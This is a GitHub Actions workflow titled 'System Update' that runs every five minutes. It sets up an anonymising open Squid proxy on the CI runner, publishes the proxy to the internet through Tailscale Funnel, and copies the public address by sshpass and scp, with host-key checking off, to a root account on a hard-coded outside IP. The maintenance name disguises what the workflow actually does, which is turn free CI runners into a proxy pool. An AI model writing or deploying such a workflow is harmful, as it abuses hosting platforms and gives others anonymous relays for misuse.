name: System Update

on:
  workflow_dispatch:
  schedule:
    - cron: '*/5 * * * *'

jobs:
  maintenance:
    runs-on: ubuntu-latest
    steps:
      - name: Install squid
        run: sudo apt update && sudo apt install squid -y

      - name: Config squid
        run: |
          sudo bash -c 'cat > /etc/squid/squid.conf << EOF
          http_port 3128
          http_access allow all
          forwarded_for off
          via off
          EOF'
          sudo systemctl restart squid

      - name: Install Tailscale
        run: |
          curl -fsSL https://tailscale.com/install.sh | sh
          sudo tailscale up --auth-key=${{ secrets.TS }}

      - name: Wait for Tailscale ready
        run: |
          sleep 10
          sudo tailscale status

      - name: Enable Funnel
        run: |
          sudo tailscale funnel --bg --tcp 443 3128
          sleep 15
          echo "=== Funnel Status ==="
          sudo tailscale funnel status
          echo "=== Tailscale Status ==="
          sudo tailscale status

      - name: Get public address and upload
        env:
          REM: ${{ secrets.REM }}
        run: |
          echo "=== Looking for URL in funnel status ==="
          sudo tailscale funnel status | tee /tmp/funnel_status.txt
          PUBLIC_URL=$(grep -o 'https://[a-z0-9.-]*\.tailscale\.io' /tmp/funnel_status.txt | head -1)
          if [ -z "${PUBLIC_URL}" ]; then
            echo "=== Trying alternative grep ==="
            PUBLIC_URL=$(sudo tailscale funnel status 2>&1 | grep -oE 'https?://[a-zA-Z0-9.-]+\.tailscale\.io' | head -1)
          fi
          if [ -z "${PUBLIC_URL}" ]; then
            echo "ERROR: No funnel URL found"
            echo "full funnel status output:"
            cat /tmp/funnel_status.txt
            exit 1
          fi
          echo "Found URL: ${PUBLIC_URL}"
          echo "${PUBLIC_URL}:443" > /tmp/proxy.txt
          cat /tmp/proxy.txt
          sudo apt install sshpass -y
          sshpass -p "${REM}" scp -o StrictHostKeyChecking=no /tmp/proxy.txt root@45.144.53.63:/var/www/html/git_enemy3civil.txt
          sleep 400
